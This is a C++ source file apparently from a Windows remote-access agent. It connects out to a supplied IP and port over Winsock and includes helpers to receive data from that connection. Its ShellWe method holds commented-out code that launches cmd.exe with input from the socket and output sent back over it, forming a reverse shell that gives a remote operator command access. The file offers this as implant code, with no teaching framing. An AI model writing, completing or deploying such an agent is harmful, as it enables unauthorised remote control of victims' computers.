#include "Agent.h"

Agent::Agent(PCSTR ip, PCSTR port)
{
	Agent::Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	Agent::Connect(ip, port);
}

void Agent::Socket(int addressFamily, int sockType, int sockProto)
{
	int status;
	status = WSAStartup(MAKEWORD(2, 2), &(this->data));
	if (status != 0)
	{
		fprintf(stderr, "WSAStartup error: %d\n", status);
		exit(1);
	}

	ZeroMemory(&(this->StrcClient), sizeof(this->StrcClient));
	this->StrcClient.ai_family = addressFamily;
	this->StrcClient.ai_socktype = sockType;
	this->StrcClient.ai_protocol = sockProto;
	this->StrcClient.ai_flags = AI_PASSIVE;
}

void Agent::Connect(PCSTR ip, PCSTR port)
{
	int status;
	status = getaddrinfo(ip, port, &(this->StrcClient), &(this->StrcClientOut));
	if (status != 0)
	{
		fprintf(stderr, "getaddrinfo error: %d\n", status);
		Agent::~Agent();
		exit(1);
	}

	for (struct addrinfo* ptr = this->StrcClientOut; ptr != nullptr; ptr = ptr->ai_next)
	{
		this->connSocket = WSASocket(this->StrcClientOut->ai_family, this->StrcClientOut->ai_socktype, this->StrcClientOut->ai_protocol, NULL, 0, 0);
		if (this->connSocket == INVALID_SOCKET)
		{
			fprintf(stderr, "Socket error: %ld\n", WSAGetLastError());
			Agent::~Agent();
			exit(1);
		}

		status = WSAConnect(this->connSocket, this->StrcClientOut->ai_addr, (int)this->StrcClientOut->ai_addrlen, NULL, NULL, NULL, NULL);
		if (status == SOCKET_ERROR)
		{
			closesocket(this->connSocket);
			this->connSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (this->connSocket == INVALID_SOCKET)
	{
		fprintf(stderr, "Unable to establish connection\n");
		Agent::~Agent();
		exit(1);
	}
}

int Agent::Recv(SOCKET sock, void* data, int data_size)
{
	int recved;
	int total_recved = 0;
	char* dbuf = static_cast<char*>(data);
	do
	{
		recved = recv(sock, dbuf, data_size, 0);
		if (recved <= 0)
		{
			// recved == 0 --> connection closed
			// recved == -1 --> SOCKET_ERROR
			return 0;
		}
		total_recved += recved;
		dbuf += recved;

	} while (data_size > total_recved);
	return total_recved;
}

bool Agent::ReadSize(SOCKET sock, unsigned long* size)
{
	if (!Agent::Recv(sock, static_cast<void*>(size), sizeof(*size))) // might need to change it
		return false;
	*size = ntohl(*size);
	return true;
}

Agent::~Agent()
{
	if (this->connSocket != INVALID_SOCKET)
		closesocket(this->connSocket);

	if (this->StrcClientOut)
		freeaddrinfo(this->StrcClientOut);

	WSACleanup();
}

void Agent::ShellWe()
{
	//HANDLE cH_read;
	//HANDLE cH_write;
	//DWORD bytesToRead;
	//BOOL bSuccess = FALSE;
	//std::vector<char> buffer(512, 0);
	//SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	//bSuccess = CreatePipe(&cH_read, &cH_write, &sa, 0);
	//if (not bSuccess)
	//{
	//	std::cerr << "CreatePipe failed" << std::endl;
	//}

	//STARTUPINFOA si;
	//PROCESS_INFORMATION pi;

	//ZeroMemory(&si, sizeof(si));
	//si.cb = sizeof(si);
	//si.dwFlags |= STARTF_USESTDHANDLES;
	//si.hStdOutput = si.hStdError = cH_write;
	//si.hStdInput = (HANDLE)this->connSocket;

	//ZeroMemory(&pi, sizeof(pi));

	//CreateProcessA(NULL,
	//	(LPSTR)"cmd.exe",
	//	NULL,
	//	NULL,
	//	TRUE,
	//	0,
	//	NULL,
	//	NULL,
	//	&si,
	//	&pi);

	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);
	//CloseHandle(cH_write);

	//for (;;) {

	//	bSuccess = ReadFile(cH_read,
	//		buffer.data(),
	//		BUF_SIZE - 1,
	//		&bytesToRead,
	//		NULL);

	//	if (not bSuccess || bytesToRead == 0) break;

	//	bSuccess = SendMsg(this->connSocket, buffer.data(), bytesToRead);
	//	if (not bSuccess) {
	//		// handle the error
	//	}

	//}
}
